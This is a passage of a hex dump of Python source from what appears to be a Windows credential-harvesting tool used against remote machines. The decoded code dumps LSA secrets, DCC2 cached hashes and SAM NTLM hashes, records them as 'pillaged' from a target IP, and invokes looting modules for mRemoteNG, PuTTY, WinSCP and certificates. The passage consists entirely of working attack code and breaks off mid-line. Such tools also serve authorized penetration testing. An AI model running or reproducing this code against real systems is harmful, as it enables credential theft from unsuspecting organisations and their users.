-00017730: 6620 7573 6572 6e61 6d65 2e64 6563 6f64  f username.decod
-00017740: 6528 2775 7466 2d38 2729 206e 6f74 2069  e('utf-8') not i
-00017750: 6e20 5b27 6470 6170 695f 6d61 6368 696e  n ['dpapi_machin
-00017760: 656b 6579 272c 2027 6470 6170 695f 7573  ekey', 'dpapi_us
-00017770: 6572 6b65 7927 2c20 274e 4c24 4b4d 275d  erkey', 'NL$KM']
-00017780: 3a0a 0909 0909 0909 0969 6620 7573 6572  :........if user
-00017790: 6e61 6d65 2e64 6563 6f64 6528 2775 7466  name.decode('utf
-000177a0: 2d38 2729 206e 6f74 2069 6e20 7365 6c66  -8') not in self
-000177b0: 2e6f 7074 696f 6e73 2e63 7265 647a 3a0a  .options.credz:.
-000177c0: 0a09 0909 0909 0909 0973 656c 662e 6f70  .........self.op
-000177d0: 7469 6f6e 732e 6372 6564 7a5b 7573 6572  tions.credz[user
-000177e0: 6e61 6d65 2e64 6563 6f64 6528 2775 7466  name.decode('utf
-000177f0: 2d38 2729 5d20 3d20 5b70 6173 7377 6f72  -8')] = [passwor
-00017800: 642e 6465 636f 6465 2827 7574 662d 3827  d.decode('utf-8'
-00017810: 295d 0a09 0909 0909 0909 0973 656c 662e  )].........self.
-00017820: 6c6f 6767 696e 672e 696e 666f 280a 0909  logging.info(...
-00017830: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
-00017840: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00017850: 707d 5d20 5b2b 5d20 7b62 636f 6c6f 7273  p}] [+] {bcolors
-00017860: 2e4f 4b42 4c55 457d 204c 5341 203a 207b  .OKBLUE} LSA : {
-00017870: 6263 6f6c 6f72 732e 4f4b 4752 4545 4e7d  bcolors.OKGREEN}
-00017880: 207b 7573 6572 6e61 6d65 2e64 6563 6f64   {username.decod
-00017890: 6528 2775 7466 2d38 2729 7d20 3a20 7b70  e('utf-8')} : {p
-000178a0: 6173 7377 6f72 642e 6465 636f 6465 2827  assword.decode('
-000178b0: 7574 662d 3827 297d 207b 6263 6f6c 6f72  utf-8')} {bcolor
-000178c0: 732e 454e 4443 7d22 290a 0a09 0909 0909  s.ENDC}").......
-000178d0: 0909 656c 7365 3a0a 0909 0909 0909 0909  ..else:.........
-000178e0: 6966 2070 6173 7377 6f72 642e 6465 636f  if password.deco
-000178f0: 6465 2827 7574 662d 3827 2920 6e6f 7420  de('utf-8') not 
-00017900: 696e 2073 656c 662e 6f70 7469 6f6e 732e  in self.options.
-00017910: 6372 6564 7a5b 7573 6572 6e61 6d65 2e64  credz[username.d
-00017920: 6563 6f64 6528 2775 7466 2d38 2729 5d3a  ecode('utf-8')]:
-00017930: 0a09 0909 0909 0909 0909 7365 6c66 2e6f  ..........self.o
-00017940: 7074 696f 6e73 2e63 7265 647a 5b75 7365  ptions.credz[use
-00017950: 726e 616d 652e 6465 636f 6465 2827 7574  rname.decode('ut
-00017960: 662d 3827 295d 2e61 7070 656e 6428 7061  f-8')].append(pa
-00017970: 7373 776f 7264 2e64 6563 6f64 6528 2775  ssword.decode('u
-00017980: 7466 2d38 2729 290a 0909 0909 0909 0909  tf-8')).........
-00017990: 0973 656c 662e 6c6f 6767 696e 672e 696e  .self.logging.in
-000179a0: 666f 280a 0909 0909 0909 0909 0909 6622  fo(...........f"
-000179b0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-000179c0: 6172 6765 745f 6970 7d5d 205b 2b5d 207b  arget_ip}] [+] {
-000179d0: 6263 6f6c 6f72 732e 4f4b 424c 5545 7d20  bcolors.OKBLUE} 
-000179e0: 4c53 4120 3a20 7b62 636f 6c6f 7273 2e4f  LSA : {bcolors.O
-000179f0: 4b47 5245 454e 7d20 7b75 7365 726e 616d  KGREEN} {usernam
-00017a00: 652e 6465 636f 6465 2827 7574 662d 3827  e.decode('utf-8'
-00017a10: 297d 203a 207b 7061 7373 776f 7264 2e64  )} : {password.d
-00017a20: 6563 6f64 6528 2775 7466 2d38 2729 7d20  ecode('utf-8')} 
-00017a30: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
-00017a40: 0a09 0909 0909 0909 2323 2323 2323 2323  ........########
-00017a50: 2323 2323 5052 4f43 4553 5349 4e47 2044  ####PROCESSING D
-00017a60: 4154 410a 0909 0909 0909 0973 656c 662e  ATA........self.
-00017a70: 6462 2e61 6464 5f63 7265 647a 2863 7265  db.add_credz(cre
-00017a80: 647a 5f74 7970 653d 274c 5341 272c 0a09  dz_type='LSA',..
-00017a90: 0909 0909 0909 0909 0909 2020 6372 6564  ..........  cred
-00017aa0: 7a5f 7573 6572 6e61 6d65 3d75 7365 726e  z_username=usern
-00017ab0: 616d 652e 6465 636f 6465 2827 7574 662d  ame.decode('utf-
-00017ac0: 3827 292c 0a09 0909 0909 0909 0909 0909  8'),............
-00017ad0: 2020 6372 6564 7a5f 7061 7373 776f 7264    credz_password
-00017ae0: 3d70 6173 7377 6f72 642e 6465 636f 6465  =password.decode
-00017af0: 2827 7574 662d 3827 292c 0a09 0909 0909  ('utf-8'),......
-00017b00: 0909 0909 0909 2020 6372 6564 7a5f 7461  ......  credz_ta
-00017b10: 7267 6574 3d27 272c 0a09 0909 0909 0909  rget='',........
-00017b20: 0909 0909 2020 6372 6564 7a5f 7061 7468  ....  credz_path
-00017b30: 3d74 6d70 5f66 696c 6564 6573 742c 0a09  =tmp_filedest,..
-00017b40: 0909 0909 0909 0909 0909 2020 7069 6c6c  ..........  pill
-00017b50: 6167 6564 5f66 726f 6d5f 636f 6d70 7574  aged_from_comput
-00017b60: 6572 5f69 703d 7365 6c66 2e6f 7074 696f  er_ip=self.optio
-00017b70: 6e73 2e74 6172 6765 745f 6970 2c0a 0909  ns.target_ip,...
-00017b80: 0909 0909 0909 0909 0920 2070 696c 6c61  .........  pilla
-00017b90: 6765 645f 6672 6f6d 5f75 7365 726e 616d  ged_from_usernam
-00017ba0: 653d 274d 4143 4849 4e45 2427 290a 0a09  e='MACHINE$')...
-00017bb0: 0909 0965 6c73 653a 0a09 0909 0909 7365  ...else:......se
-00017bc0: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
-00017bd0: 2822 5365 6372 6574 2025 6920 2d20 2573  ("Secret %i - %s
-00017be0: 2220 2520 2869 6e64 6578 2c20 7365 6372  " % (index, secr
-00017bf0: 6574 2929 0a09 0965 7863 6570 7420 4578  et))...except Ex
-00017c00: 6365 7074 696f 6e20 6173 2065 783a 0a09  ception as ex:..
-00017c10: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
-00017c20: 6562 7567 280a 0909 0909 6622 5b7b 7365  ebug(.....f"[{se
-00017c30: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
-00017c40: 745f 6970 7d5d 2045 7863 6570 7420 7265  t_ip}] Except re
-00017c50: 6d6f 7465 4f70 7320 5365 6372 6574 7322  moteOps Secrets"
-00017c60: 290a 0909 0973 656c 662e 6c6f 6767 696e  )....self.loggin
-00017c70: 672e 6465 6275 6728 6578 290a 0a09 0974  g.debug(ex)....t
-00017c80: 7279 3a0a 0909 0923 2341 6464 2044 4343  ry:....##Add DCC
-00017c90: 320a 0a09 0909 746d 705f 6669 6c65 6465  2.....tmp_filede
-00017ca0: 7374 203d 2066 696c 6564 6573 7420 2b20  st = filedest + 
-00017cb0: 272e 6361 6368 6564 270a 0909 0966 203d  '.cached'....f =
-00017cc0: 206f 7065 6e28 746d 705f 6669 6c65 6465   open(tmp_filede
-00017cd0: 7374 2c20 2772 6227 290a 0909 0973 6563  st, 'rb')....sec
-00017ce0: 7265 7473 203d 2066 2e72 6561 6428 292e  rets = f.read().
-00017cf0: 7370 6c69 7428 6227 5c6e 2729 0a09 0909  split(b'\n')....
-00017d00: 662e 636c 6f73 6528 290a 0909 0966 6f72  f.close()....for
-00017d10: 2069 6e64 6578 2c20 7365 6372 6574 2069   index, secret i
-00017d20: 6e20 656e 756d 6572 6174 6528 7365 6372  n enumerate(secr
-00017d30: 6574 7329 3a0a 0909 0909 6966 2062 273a  ets):.....if b':
-00017d40: 2720 696e 2073 6563 7265 7420 616e 6420  ' in secret and 
-00017d50: 6227 2327 2069 6e20 7365 6372 6574 3a0a  b'#' in secret:.
-00017d60: 0909 0909 0969 6620 7365 6372 6574 2e63  .....if secret.c
-00017d70: 6f75 6e74 2862 273a 2729 203d 3d20 313a  ount(b':') == 1:
-00017d80: 0a09 0909 0909 0975 7365 726e 616d 652c  .......username,
-00017d90: 2070 6173 7377 6f72 6420 3d20 7365 6372   password = secr
-00017da0: 6574 2e73 706c 6974 2862 273a 2729 0a09  et.split(b':')..
-00017db0: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
-00017dc0: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
-00017dd0: 6622 5b7b 7365 6c66 2e6f 7074 696f 6e73  f"[{self.options
-00017de0: 2e74 6172 6765 745f 6970 7d5d 207b 6263  .target_ip}] {bc
-00017df0: 6f6c 6f72 732e 4f4b 424c 5545 7d5b 2d5d  olors.OKBLUE}[-]
-00017e00: 2046 6f75 6e64 2044 4343 3220 6861 7368   Found DCC2 hash
-00017e10: 203a 7b62 636f 6c6f 7273 2e4f 4b47 5245   :{bcolors.OKGRE
-00017e20: 454e 7d20 7b73 6563 7265 742e 6465 636f  EN} {secret.deco
-00017e30: 6465 2827 7574 662d 3827 297d 7b62 636f  de('utf-8')}{bco
-00017e40: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
-00017e50: 0909 0923 2323 2323 2323 2323 2323 2350  ...############P
-00017e60: 524f 4345 5353 494e 4720 4441 5441 0a09  ROCESSING DATA..
-00017e70: 0909 0909 0973 656c 662e 6462 2e61 6464  .....self.db.add
-00017e80: 5f63 7265 647a 2863 7265 647a 5f74 7970  _credz(credz_typ
-00017e90: 653d 2744 4343 3227 2c0a 0909 0909 0909  e='DCC2',.......
-00017ea0: 0909 0909 2020 6372 6564 7a5f 7573 6572  ....  credz_user
-00017eb0: 6e61 6d65 3d75 7365 726e 616d 652e 6465  name=username.de
-00017ec0: 636f 6465 2827 7574 662d 3827 292c 0a09  code('utf-8'),..
-00017ed0: 0909 0909 0909 0909 0920 2063 7265 647a  .........  credz
-00017ee0: 5f70 6173 7377 6f72 643d 7061 7373 776f  _password=passwo
-00017ef0: 7264 2e64 6563 6f64 6528 2775 7466 2d38  rd.decode('utf-8
-00017f00: 2729 2c0a 0909 0909 0909 0909 0909 2020  '),...........  
-00017f10: 6372 6564 7a5f 7461 7267 6574 3d27 272c  credz_target='',
-00017f20: 0a09 0909 0909 0909 0909 0920 2063 7265  ...........  cre
-00017f30: 647a 5f70 6174 683d 746d 705f 6669 6c65  dz_path=tmp_file
-00017f40: 6465 7374 2c0a 0909 0909 0909 0909 0909  dest,...........
-00017f50: 2020 7069 6c6c 6167 6564 5f66 726f 6d5f    pillaged_from_
-00017f60: 636f 6d70 7574 6572 5f69 703d 7365 6c66  computer_ip=self
-00017f70: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-00017f80: 6970 2c0a 0909 0909 0909 0909 0909 2020  ip,...........  
-00017f90: 7069 6c6c 6167 6564 5f66 726f 6d5f 7573  pillaged_from_us
-00017fa0: 6572 6e61 6d65 3d27 4d41 4348 494e 4524  ername='MACHINE$
-00017fb0: 2729 0a0a 0909 0909 656c 7365 3a0a 0909  ')......else:...
-00017fc0: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-00017fd0: 6465 6275 6728 2253 6563 7265 7420 2569  debug("Secret %i
-00017fe0: 202d 2025 7322 2025 2028 696e 6465 782c   - %s" % (index,
-00017ff0: 2073 6563 7265 7429 290a 0909 6578 6365   secret))...exce
-00018000: 7074 2045 7863 6570 7469 6f6e 2061 7320  pt Exception as 
-00018010: 6578 3a0a 0909 0973 656c 662e 6c6f 6767  ex:....self.logg
-00018020: 696e 672e 6465 6275 6728 0a09 0909 0966  ing.debug(.....f
-00018030: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
-00018040: 7461 7267 6574 5f69 707d 5d20 4578 6365  target_ip}] Exce
-00018050: 7074 2072 656d 6f74 654f 7073 204c 5341  pt remoteOps LSA
-00018060: 2044 4343 3222 290a 0909 0973 656c 662e   DCC2")....self.
-00018070: 6c6f 6767 696e 672e 6465 6275 6728 6578  logging.debug(ex
-00018080: 290a 0a09 0974 7279 3a0a 0909 0923 2041  )....try:....# A
-00018090: 6464 2053 414d 0a09 0909 7365 6c66 2e6c  dd SAM....self.l
-000180a0: 6f67 6769 6e67 2e69 6e66 6f28 6622 5b7b  ogging.info(f"[{
-000180b0: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
-000180c0: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
-000180d0: 732e 4f4b 424c 5545 7d20 5b2b 5d20 4475  s.OKBLUE} [+] Du
-000180e0: 6d70 696e 6720 5341 4d20 5365 6372 6574  mping SAM Secret
-000180f0: 737b 6263 6f6c 6f72 732e 454e 4443 7d22  s{bcolors.ENDC}"
-00018100: 290a 0909 0953 414d 4669 6c65 4e61 6d65  )....SAMFileName
-00018110: 203d 2073 656c 662e 5f5f 7265 6d6f 7465   = self.__remote
-00018120: 4f70 732e 7361 7665 5341 4d28 290a 0909  Ops.saveSAM()...
-00018130: 0973 656c 662e 5f5f 5341 4d48 6173 6865  .self.__SAMHashe
-00018140: 7320 3d20 4d79 5341 4d48 6173 6865 7328  s = MySAMHashes(
-00018150: 5341 4d46 696c 654e 616d 652c 2073 656c  SAMFileName, sel
-00018160: 662e 5f5f 626f 6f74 4b65 792c 2069 7352  f.__bootKey, isR
-00018170: 656d 6f74 653d 5472 7565 290a 0909 0973  emote=True)....s
-00018180: 656c 662e 5f5f 5341 4d48 6173 6865 732e  elf.__SAMHashes.
-00018190: 6475 6d70 2829 0a09 0909 6669 6c65 6465  dump()....filede
-000181a0: 7374 203d 206f 732e 7061 7468 2e6a 6f69  st = os.path.joi
-000181b0: 6e28 6f73 2e70 6174 682e 6a6f 696e 2873  n(os.path.join(s
-000181c0: 656c 662e 6f70 7469 6f6e 732e 6f75 7470  elf.options.outp
-000181d0: 7574 5f64 6972 6563 746f 7279 2c20 7365  ut_directory, se
-000181e0: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
-000181f0: 745f 6970 292c 2027 5341 4d27 290a 0909  t_ip), 'SAM')...
-00018200: 0973 656c 662e 5f5f 5341 4d48 6173 6865  .self.__SAMHashe
-00018210: 732e 6578 706f 7274 2866 696c 6564 6573  s.export(filedes
-00018220: 7429 0a09 0909 2320 4164 6469 6e67 2053  t)....# Adding S
-00018230: 414d 2068 6173 6820 746f 2063 7265 647a  AM hash to credz
-00018240: 0a09 0909 746d 705f 6669 6c65 6465 7374  ....tmp_filedest
-00018250: 203d 2066 696c 6564 6573 7420 2b20 272e   = filedest + '.
-00018260: 7361 6d27 0a09 0909 6620 3d20 6f70 656e  sam'....f = open
-00018270: 2874 6d70 5f66 696c 6564 6573 742c 2027  (tmp_filedest, '
-00018280: 7262 2729 0a09 0909 7361 6d5f 6461 7461  rb')....sam_data
-00018290: 203d 2066 2e72 6561 6428 292e 7370 6c69   = f.read().spli
-000182a0: 7428 6227 5c6e 2729 0a09 0909 662e 636c  t(b'\n')....f.cl
-000182b0: 6f73 6528 290a 0909 0966 6f72 2073 616d  ose()....for sam
-000182c0: 5f6c 696e 6520 696e 2073 616d 5f64 6174  _line in sam_dat
-000182d0: 613a 0a09 0909 0969 6620 6227 3a27 2069  a:.....if b':' i
-000182e0: 6e20 7361 6d5f 6c69 6e65 3a0a 0909 0909  n sam_line:.....
-000182f0: 0969 6620 7361 6d5f 6c69 6e65 2e63 6f75  .if sam_line.cou
-00018300: 6e74 2862 273a 2729 203d 3d20 363a 0a09  nt(b':') == 6:..
-00018310: 0909 0909 0975 7365 726e 616d 652c 2073  .....username, s
-00018320: 6964 2c20 6c6d 2c20 6e74 6c6d 2c20 5f2c  id, lm, ntlm, _,
-00018330: 205f 2c20 5f20 3d20 7361 6d5f 6c69 6e65   _, _ = sam_line
-00018340: 2e73 706c 6974 2862 273a 2729 0a09 0909  .split(b':')....
-00018350: 0909 0923 204f 6e20 6e65 206c 2761 6a6f  ...# On ne l'ajo
-00018360: 7574 6520 7061 7320 6175 7820 6372 6564  ute pas aux cred
-00018370: 7a2c 2063 2765 7374 2075 6e20 6861 7368  z, c'est un hash
-00018380: 204e 544c 4d2c 2069 6c20 6e65 2070 6575   NTLM, il ne peu
-00018390: 7420 7061 7320 6574 7265 2075 7469 6c69  t pas etre utili
-000183a0: 73c3 a920 7061 7220 6470 6170 690a 0909  s.. par dpapi...
-000183b0: 0909 0909 2727 270a 0909 0909 0909 6966  ....'''.......if
-000183c0: 2075 7365 726e 616d 652e 6465 636f 6465   username.decode
-000183d0: 2827 7574 662d 3827 2920 6e6f 7420 696e  ('utf-8') not in
-000183e0: 2073 656c 662e 6f70 7469 6f6e 732e 6372   self.options.cr
-000183f0: 6564 7a3a 0a09 0909 0909 0909 7365 6c66  edz:........self
-00018400: 2e6f 7074 696f 6e73 2e63 7265 647a 5b75  .options.credz[u
-00018410: 7365 726e 616d 652e 6465 636f 6465 2827  sername.decode('
-00018420: 7574 662d 3827 295d 203d 205b 6e74 6c6d  utf-8')] = [ntlm
-00018430: 2e64 6563 6f64 6528 2775 7466 2d38 2729  .decode('utf-8')
-00018440: 5d0a 0909 0909 0909 656c 7365 3a0a 0909  ].......else:...
-00018450: 0909 0909 0969 6620 6e74 6c6d 2e64 6563  .....if ntlm.dec
-00018460: 6f64 6528 2775 7466 2d38 2729 206e 6f74  ode('utf-8') not
-00018470: 2069 6e20 7365 6c66 2e6f 7074 696f 6e73   in self.options
-00018480: 2e63 7265 647a 5b75 7365 726e 616d 652e  .credz[username.
-00018490: 6465 636f 6465 2827 7574 662d 3827 295d  decode('utf-8')]
-000184a0: 3a0a 0909 0909 0909 0909 7365 6c66 2e6f  :.........self.o
-000184b0: 7074 696f 6e73 2e63 7265 647a 5b75 7365  ptions.credz[use
-000184c0: 726e 616d 652e 6465 636f 6465 2827 7574  rname.decode('ut
-000184d0: 662d 3827 295d 2e61 7070 656e 6428 6e74  f-8')].append(nt
-000184e0: 6c6d 2e64 6563 6f64 6528 2775 7466 2d38  lm.decode('utf-8
-000184f0: 2729 290a 0909 0909 0909 2727 270a 0909  ')).......'''...
-00018500: 0909 0909 2323 2323 2323 2323 2323 2323  ....############
-00018510: 5052 4f43 4553 5349 4e47 2044 4154 410a  PROCESSING DATA.
-00018520: 0909 0909 0909 7365 6c66 2e64 622e 6164  ......self.db.ad
-00018530: 645f 6372 6564 7a28 6372 6564 7a5f 7479  d_credz(credz_ty
-00018540: 7065 3d27 5341 4d27 2c0a 0909 0909 0909  pe='SAM',.......
-00018550: 0909 0909 2020 6372 6564 7a5f 7573 6572  ....  credz_user
-00018560: 6e61 6d65 3d75 7365 726e 616d 652e 6465  name=username.de
-00018570: 636f 6465 2827 7574 662d 3827 292c 0a09  code('utf-8'),..
-00018580: 0909 0909 0909 0909 0920 2063 7265 647a  .........  credz
-00018590: 5f70 6173 7377 6f72 643d 6e74 6c6d 2e64  _password=ntlm.d
-000185a0: 6563 6f64 6528 2775 7466 2d38 2729 2c0a  ecode('utf-8'),.
-000185b0: 0909 0909 0909 0909 0909 2020 6372 6564  ..........  cred
-000185c0: 7a5f 7461 7267 6574 3d27 272c 0a09 0909  z_target='',....
-000185d0: 0909 0909 0909 0920 2063 7265 647a 5f70  .......  credz_p
-000185e0: 6174 683d 746d 705f 6669 6c65 6465 7374  ath=tmp_filedest
-000185f0: 2c0a 0909 0909 0909 0909 0909 2020 7069  ,...........  pi
-00018600: 6c6c 6167 6564 5f66 726f 6d5f 636f 6d70  llaged_from_comp
-00018610: 7574 6572 5f69 703d 7365 6c66 2e6f 7074  uter_ip=self.opt
-00018620: 696f 6e73 2e74 6172 6765 745f 6970 2c0a  ions.target_ip,.
-00018630: 0909 0909 0909 0909 0909 2020 7069 6c6c  ..........  pill
-00018640: 6167 6564 5f66 726f 6d5f 7573 6572 6e61  aged_from_userna
-00018650: 6d65 3d27 4d41 4348 494e 4524 2729 0a09  me='MACHINE$')..
-00018660: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e69  ..self.logging.i
-00018670: 6e66 6f28 0a09 0909 0966 225b 7b73 656c  nfo(.....f"[{sel
-00018680: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
-00018690: 5f69 707d 5d20 5b2b 5d20 7b62 636f 6c6f  _ip}] [+] {bcolo
-000186a0: 7273 2e4f 4b42 4c55 457d 2053 414d 203a  rs.OKBLUE} SAM :
-000186b0: 2043 6f6c 6c65 6374 6564 207b 6263 6f6c   Collected {bcol
-000186c0: 6f72 732e 4f4b 4752 4545 4e7d 7b6c 656e  ors.OKGREEN}{len
-000186d0: 2873 616d 5f64 6174 6129 7d20 6861 7368  (sam_data)} hash
-000186e0: 6573 207b 6263 6f6c 6f72 732e 454e 4443  es {bcolors.ENDC
-000186f0: 7d22 290a 0909 2320 6c6f 6767 696e 672e  }")...# logging.
-00018700: 6765 744c 6f67 6765 7228 292e 7365 744c  getLogger().setL
-00018710: 6576 656c 286c 6f67 6769 6e67 2e44 4542  evel(logging.DEB
-00018720: 5547 290a 0909 6578 6365 7074 2045 7863  UG)...except Exc
-00018730: 6570 7469 6f6e 2061 7320 6578 3a0a 0909  eption as ex:...
-00018740: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-00018750: 6275 6728 0a09 0909 0966 225b 7b73 656c  bug(.....f"[{sel
-00018760: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
-00018770: 5f69 707d 5d20 4578 6365 7074 2072 656d  _ip}] Except rem
-00018780: 6f74 654f 7073 2053 414d 2229 0a09 0909  oteOps SAM")....
-00018790: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-000187a0: 7567 2865 7829 0a09 0973 656c 662e 5f5f  ug(ex)...self.__
-000187b0: 7265 6d6f 7465 4f70 732e 6669 6e69 7368  remoteOps.finish
-000187c0: 2829 0a09 0972 6574 7572 6e20 310a 0a09  ()...return 1...
-000187d0: 6465 6620 4765 7452 6563 656e 7446 696c  def GetRecentFil
-000187e0: 6573 2873 656c 6629 3a0a 0909 6d79 5265  es(self):...myRe
-000187f0: 6365 6e74 4669 6c65 7320 3d20 7265 6365  centFiles = rece
-00018800: 6e74 5f66 696c 6573 2873 656c 662e 736d  nt_files(self.sm
-00018810: 622c 2073 656c 662e 6d79 7265 676f 7073  b, self.myregops
-00018820: 2c20 7365 6c66 2e6d 7966 696c 656f 7073  , self.myfileops
-00018830: 2c20 7365 6c66 2e6c 6f67 6769 6e67 2c20  , self.logging, 
-00018840: 7365 6c66 2e6f 7074 696f 6e73 2c20 7365  self.options, se
-00018850: 6c66 2e64 622c 0a09 0909 0909 0909 0909  lf.db,..........
-00018860: 2073 656c 662e 7573 6572 7329 0a09 096d   self.users)...m
-00018870: 7952 6563 656e 7446 696c 6573 2e72 756e  yRecentFiles.run
-00018880: 2829 0a0a 0964 6566 2047 6574 4d52 656d  ()...def GetMRem
-00018890: 6f74 654e 4728 7365 6c66 293a 0a09 0966  oteNG(self):...f
-000188a0: 726f 6d20 736f 6674 7761 7265 2e6d 616e  rom software.man
-000188b0: 6167 6572 2e6d 5265 6d6f 7465 4e47 2069  ager.mRemoteNG i
-000188c0: 6d70 6f72 7420 6d52 656d 6f74 654e 470a  mport mRemoteNG.
-000188d0: 0909 6d79 4d52 656d 6f74 654e 4720 3d20  ..myMRemoteNG = 
-000188e0: 6d52 656d 6f74 654e 4728 7365 6c66 2e73  mRemoteNG(self.s
-000188f0: 6d62 2c20 7365 6c66 2e6d 7972 6567 6f70  mb, self.myregop
-00018900: 732c 2073 656c 662e 6d79 6669 6c65 6f70  s, self.myfileop
-00018910: 732c 2073 656c 662e 6c6f 6767 696e 672c  s, self.logging,
-00018920: 2073 656c 662e 6f70 7469 6f6e 732c 2073   self.options, s
-00018930: 656c 662e 6462 2c0a 0909 0909 0909 0909  elf.db,.........
-00018940: 7365 6c66 2e75 7365 7273 290a 0909 6d79  self.users)...my
-00018950: 4d52 656d 6f74 654e 472e 7275 6e28 290a  MRemoteNG.run().
-00018960: 0a09 6465 6620 4765 7450 7574 7479 2873  ..def GetPutty(s
-00018970: 656c 6629 3a0a 0909 6672 6f6d 2073 6f66  elf):...from sof
-00018980: 7477 6172 652e 7379 7361 646d 696e 2e70  tware.sysadmin.p
-00018990: 7574 7479 2069 6d70 6f72 7420 5075 7474  utty import Putt
-000189a0: 790a 0909 6d79 5075 7474 7920 3d20 5075  y...myPutty = Pu
-000189b0: 7474 7928 7365 6c66 2e73 6d62 2c20 7365  tty(self.smb, se
-000189c0: 6c66 2e6d 7972 6567 6f70 732c 2073 656c  lf.myregops, sel
-000189d0: 662e 6d79 6669 6c65 6f70 732c 2073 656c  f.myfileops, sel
-000189e0: 662e 6c6f 6767 696e 672c 2073 656c 662e  f.logging, self.
-000189f0: 6f70 7469 6f6e 732c 2073 656c 662e 6462  options, self.db
-00018a00: 290a 0909 6d79 5075 7474 792e 7275 6e28  )...myPutty.run(
-00018a10: 290a 0a09 6465 6620 4765 7457 696e 7363  )...def GetWinsc
-00018a20: 7028 7365 6c66 293a 0a09 0966 726f 6d20  p(self):...from 
-00018a30: 736f 6674 7761 7265 2e73 7973 6164 6d69  software.sysadmi
-00018a40: 6e2e 7769 6e73 6370 2069 6d70 6f72 7420  n.winscp import 
-00018a50: 5769 6e73 6370 0a09 096d 7957 696e 7363  Winscp...myWinsc
-00018a60: 7020 3d20 5769 6e73 6370 2873 656c 662e  p = Winscp(self.
-00018a70: 736d 622c 2073 656c 662e 6d79 7265 676f  smb, self.myrego
-00018a80: 7073 2c20 7365 6c66 2e6d 7966 696c 656f  ps, self.myfileo
-00018a90: 7073 2c20 7365 6c66 2e6c 6f67 6769 6e67  ps, self.logging
-00018aa0: 2c20 7365 6c66 2e6f 7074 696f 6e73 2c20  , self.options, 
-00018ab0: 7365 6c66 2e64 6229 0a09 096d 7957 696e  self.db)...myWin
-00018ac0: 7363 702e 7275 6e28 290a 0a09 6465 6620  scp.run()...def 
-00018ad0: 4765 744e 6577 5f4d 6f64 756c 6528 7365  GetNew_Module(se
-00018ae0: 6c66 293a 0a09 096d 794e 6577 4d6f 6475  lf):...myNewModu
-00018af0: 6c65 203d 206e 6577 5f6d 6f64 756c 6528  le = new_module(
-00018b00: 7365 6c66 2e73 6d62 2c20 7365 6c66 2e6d  self.smb, self.m
-00018b10: 7972 6567 6f70 732c 2073 656c 662e 6d79  yregops, self.my
-00018b20: 6669 6c65 6f70 732c 2073 656c 662e 6c6f  fileops, self.lo
-00018b30: 6767 696e 672c 2073 656c 662e 6f70 7469  gging, self.opti
-00018b40: 6f6e 732c 2073 656c 662e 6462 2c0a 0909  ons, self.db,...
-00018b50: 0909 0909 0909 2073 656c 662e 7573 6572  ...... self.user
-00018b60: 7329 0a09 096d 794e 6577 4d6f 6475 6c65  s)...myNewModule
-00018b70: 2e72 756e 2829 0a0a 0964 6566 2047 6574  .run()...def Get
-00018b80: 4365 7274 6966 6963 6174 6573 2873 656c  Certificates(sel
-00018b90: 6629 3a0a 0909 6365 7274 6966 6963 6174  f):...certificat
-00018ba0: 6573 5f74 7269 6167 6520 3d20 4365 7274  es_triage = Cert
-00018bb0: 6966 6963 6174 6573 5472 6961 6765 2873  ificatesTriage(s
-00018bc0: 656c 662e 736d 622c 2073 656c 662e 6d79  elf.smb, self.my
-00018bd0: 7265 676f 7073 2c20 7365 6c66 2e6d 7966  regops, self.myf
-00018be0: 696c 656f 7073 2c20 7365 6c66 2e6c 6f67  ileops, self.log
-00018bf0: 6769 6e67 2c20 7365 6c66 2e6f 7074 696f  ging, self.optio
-00018c00: 6e73 2c0a 0909 0909 0909 0909 0909 0909  ns,.............
-00018c10: 2073 656c 662e 6462 2c20 7365 6c66 2e75   self.db, self.u
-00018c20: 7365 7273 2c20 7365 6c66 2e75 7365 725f  sers, self.user_
-00018c30: 6b65 792c 2073 656c 662e 6d61 6368 696e  key, self.machin
-00018c40: 655f 6b65 7929 0a09 0963 6572 7469 6669  e_key)...certifi
-00018c50: 6361 7465 735f 7472 6961 6765 2e72 756e  cates_triage.run
-00018c60: 2829 0a0a 0964 6566 2064 6f5f 7465 7374  ()...def do_test
-00018c70: 2873 656c 6629 3a0a 0909 7472 793a 0a09  (self):...try:..
-00018c80: 0909 6966 2073 656c 662e 6164 6d69 6e5f  ..if self.admin_
-00018c90: 7072 6976 7320 616e 6420 5472 7565 3a0a  privs and True:.
-00018ca0: 0909 0909 2320 7365 6c66 2e64 6f5f 696e  ....# self.do_in
-00018cb0: 666f 2829 0a09 0909 0973 656c 662e 646f  fo().....self.do
-00018cc0: 5f77 686f 2829 0a09 0909 0973 656c 662e  _who().....self.
-00018cd0: 6765 745f 7573 6572 7328 290a 0909 0909  get_users().....
-00018ce0: 230a 0a09 0909 0969 6620 7365 6c66 2e6f  #......if self.o
-00018cf0: 7074 696f 6e73 2e6e 6f5f 7265 6d6f 7465  ptions.no_remote
-00018d00: 6f70 7320 3d3d 2046 616c 7365 3a0a 0909  ops == False:...
-00018d10: 0909 0974 7279 3a0a 0909 0909 0909 7365  ...try:.......se
-00018d20: 6c66 2e74 6573 745f 7265 6d6f 7465 4f70  lf.test_remoteOp
